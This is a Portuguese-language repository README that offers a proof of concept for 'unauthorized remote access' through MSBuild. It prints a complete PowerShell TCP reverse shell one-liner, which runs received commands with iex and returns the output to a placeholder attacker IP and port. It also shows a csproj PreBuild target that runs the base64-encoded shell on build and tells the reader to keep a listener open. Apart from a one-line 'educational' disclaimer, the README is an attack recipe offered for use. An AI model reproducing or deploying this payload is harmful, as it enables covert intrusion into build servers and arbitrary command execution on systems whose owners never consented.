# Advenced Reverse shell C#
Este repositório, contém uma reverse shell escrita em C# comentada com passos que você
deverá fazer para conseguir acesso remoto. Lembrando que a publicação é destinada para fins educacionais.


## Objetivo:
Objetivo deste respositório, é mostrar a POC sobre o ganho de acesso remoto não autorizado
através do compilador MSBuild do Visual Code.


## Processo Geral:
- Verifique se o existe acesso ao MSBuild.
- Verifique as permissões de execução da criação do Projeto.
- Verifique a versão de execução do .NET.

### key Code Features
O código aproveita do arquivo .sln para fazer a execução de código remoto no servidor.

No CSPROJ, existe uma tag em xml que determina quais são as dependencias que o MSBuild terá
que executar antes da compilação do executável. Visando isso, podemos aproveitar desta ação para que
quando o MSBuild passar por ela, execute a nossa reverse shell que neste caso é para o powershell.


ReveseShell: `$client = New-Object System.Net.Sockets.TCPClient("Seu IP",PORTA);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

Após que ajustar a Revershell conforme Seu IP e PORTA, será necessário encodar em base64 para a execução bem sucedida.

Evento que iremos explorar:

`   <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
        <Exec Command="powershell -e **encode aqui**"/>
    </Target>`

Quando subir para o servidor e o mesmo compilar este código, atente-se de ter um listening para receber a conexão de volta.


## Créditos
[Microsoft - Build events csharp](https://learn.microsoft.com/pt-br/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022)
